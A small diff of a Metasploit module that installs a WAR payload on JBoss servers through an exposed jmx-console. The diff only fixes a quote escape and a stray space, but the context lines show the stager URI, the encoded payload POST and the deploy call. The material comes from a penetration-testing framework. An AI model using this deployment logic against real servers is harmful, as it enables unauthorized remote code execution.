@@ -15,7 +15,7 @@ class Metasploit3 < Msf::Auxiliary
       'Description'   => %q{
         This module can be used to install a WAR file payload on JBoss servers that have
         an exposed "jmx-console" application. The payload is put on the server by
-        using the jboss.system:BSHDeployer\'s createScriptDeployment() method.
+        using the jboss.system:BSHDeployer's createScriptDeployment() method.
       },
       'Author'        =>
         [
@@ -79,7 +79,7 @@ class Metasploit3 < Msf::Auxiliary
       # call the stager to deploy our real payload war
       stager_uri = '/' + stager_name + '/' + stager_name + '.jsp'
       payload_data = "#{rand_text_alpha(8+rand(8))}=#{Rex::Text.uri_encode(encoded_payload)}"
-      print_status("#{peer} - Calling stager #{stager_uri } to deploy final payload...")
+      print_status("#{peer} - Calling stager #{stager_uri} to deploy final payload...")
       res = deploy('method' => 'POST',
                    'data'   => payload_data,
                    'uri'    => stager_uri)
